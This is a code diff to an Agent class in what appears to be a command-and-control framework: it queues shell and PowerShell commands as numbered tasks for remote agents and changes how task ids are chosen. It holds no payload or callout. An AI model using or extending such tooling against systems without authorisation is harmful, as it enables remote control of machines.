@@ -22,6 +22,8 @@ class Agent:
         self.has_tasks = False
         self.path = f"../data/listeners/{self.listener_name}/agents/{self.name}/"
         self.tasks_path = "{}tasks.txt".format(self.path, self.name)
+
+        self.task_ids = []
         # self.task_ids = []
 
         if not os.path.exists(self.path):
@@ -91,19 +93,27 @@ class Agent:
         
         return 0
 
-    # def get_task_id():
-    #     seed(1)
-    #     sequence = [i for i in range(1000)]
-    #     print(sequence)
+    def generate_task_ids(self):
+        for i in range(9999):
+            self.task_ids.append(i)
+
+    def get_task_id(self):
+        seed(1)
+        task_id = choice(self.task_ids)
+        print(f"Task id is ***************{task_id}")
+        self.task_ids.remove(task_id)
+        return task_id
 
     def cmd(self, args):
 
         if len(args) == 0:
             error("Missing command.")
         else:
-
+            if not self.task_ids:
+                self.generate_task_ids()
             command = " ".join(args)
-            task = f"#22 0 {command}\n"
+            task = f"#{self.get_task_id()} 0 {command}\n"
+            # task = f"#17 0 {command}\n"
             self.write_task(task)
 
     def powershell(self, args):
@@ -167,7 +177,7 @@ class Agent:
         elif command == "home":
             men.home()
         elif command == "exit":
-            men.exit()
+            men.Exit()
         elif command == "cmd":
             self.cmd(args)
         elif command == "powershell":
